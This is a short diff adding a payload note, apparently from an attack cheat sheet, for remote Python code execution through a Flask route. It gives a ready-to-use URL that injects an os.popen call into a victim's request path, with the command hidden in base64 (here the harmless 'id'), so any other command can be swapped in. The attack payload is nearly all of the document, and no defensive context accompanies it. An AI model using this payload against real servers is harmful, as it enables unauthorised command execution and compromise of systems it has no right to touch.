@@ -1,0 +1,5 @@
+Flask route python code execution:
+
+http://victim.com/"%2b__import__('os').popen(__import__('base64').b64decode('aWQ=')).read()%2b"
+
+where aWQ= is id base64encoded
